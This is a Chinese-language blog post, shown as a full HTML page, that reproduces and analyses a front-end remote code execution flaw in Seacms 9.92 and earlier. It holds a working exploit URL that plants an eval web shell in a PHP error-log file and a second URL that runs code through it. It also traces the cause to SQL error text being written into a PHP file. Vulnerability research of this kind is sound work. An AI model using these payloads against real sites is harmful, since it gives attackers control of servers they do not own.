<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Seacms&lt;=9.92前台Getshell - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Seacms&lt;=9.92前台Getshell</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
<div class="container text-center mt-3">
    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
</div>
</div>
<div class="meta">
  <div>2019-09-27 01:01</div>
  <div>
    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
      <span><a href="https://getshe11.com/tags/seacms/">#Seacms</a></span>
      <span><a href="https://getshe11.com/tags/getshell/">#getshell</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这套程序的时候也审计了一下，后面太多事情就搁置了。</p>
<h1 id="0x02-漏洞复现">0x02 漏洞复现</h1>
<p>环境是phpstudy（最近出后门新闻最火的那个），用着也挺方便的。PHP版本是5.x的。
payload：</p>
<pre><code>http://127.0.0.1/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=*hex/@eval($_GET[_]);?%3E
</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms-front/1.png" alt="">
然后访问：</p>
<pre><code>http://127.0.0.1/data/mysqli_error_trace.php?_=phpinfo();
</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms-front/2.png" alt=""></p>
<h1 id="0x03-漏洞分析">0x03 漏洞分析</h1>
<p>关于这个SQL注入报错的地方，在之前的8.7的一篇文章里面分析过了https://getpass.cn/2019/03/04/Seacms8.7-sql-injection-analysis/</p>
<p>主要的地方还是在于<code>include/sql.class.php</code>这个文件的465-489行</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms-front/3.png" alt=""></p>
<p>它会将sql报错的信息写入了一个PHP的文件里，那我们可以就可以让sql语句报错然后将恶意语句写这个文件利用了。</p>
<h1 id="0x04-结束">0x04 结束</h1>
<p>其实这个漏洞还挺简单的，但是在其他的版本代码是不一样的，我测试了9.2的还有之前写SQL注入的8.7版本都是不能利用的。主要代码如下：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms-front/4.png" alt=""></p>
<p>这里是说如果我们要删除第476行的两个反斜杠，然后才可以显示报错的内容。我想是在很久之前的版本是直接写入PHP文件的，但是后面作为更新了，就加上这段代码，然后将之前的PHP存在的就删除掉。
但是这个说是9.92版本出现的就很奇怪了。em&hellip;</p>
<p>文章测试的9.92版本程序下载地址：https://www.lanzous.com/i6eupwh</p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">
                            0x02 漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            0x03 漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-%e7%bb%93%e6%9d%9f">
                            0x04 结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
